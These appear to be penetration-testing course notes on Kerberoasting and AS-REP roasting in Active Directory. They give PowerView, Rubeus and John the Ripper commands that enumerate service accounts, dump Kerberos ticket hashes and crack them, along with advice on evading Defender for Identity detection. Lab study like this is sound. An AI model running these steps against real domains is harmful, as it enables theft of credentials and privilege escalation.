**Let think of scenario's where there where no service or paths, how can we escalate privileges in an active directory environment, what are other opportunities/ways we can go about it ??**

# **Kerberoast**

- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!


**_Example -:_**


- Find user accounts used as Service accounts


```powershell
# AD Module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView

Get-DomainUser -SPN
```

> **Hint :** When you run `klist`, the SPN can be identified as the name of the {service/machine name}

**_Capturing Hashes :_**


- Use Rubeus to list Kerberoast stats


```powershell
Rubeus.exe kerberoast /stats
```


- Use Rubeus to request a TGS (This is a must run)


```powershell
Rubeus.exe kerberoast /user:svcadmin /simple 
```


- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC (Also must run)

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

- Kerberoast all possible accounts

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```


> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration



**_Cracking Hashes :_**


- Crack ticket using John the Ripper


```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-
worst-pass.txt C:\AD\Tools\hashes.txt
```


# **Learning Objective 14**

- Using the Kerberoast attack, crack password of a SQL server service account.


## **Solution**


**_Coming Soon_**



# **Targeted Kerberoasting - AS-REPs**


- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

**_Example -:_**


- Enumerating accounts with Kerberos Preauth disabled

```powershell
Using PowerView:
Get-DomainUser -PreauthNotRequired -Verbose
â€¢ Using ActiveDirectory module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -
Properties DoesNotRequirePreAuth
```
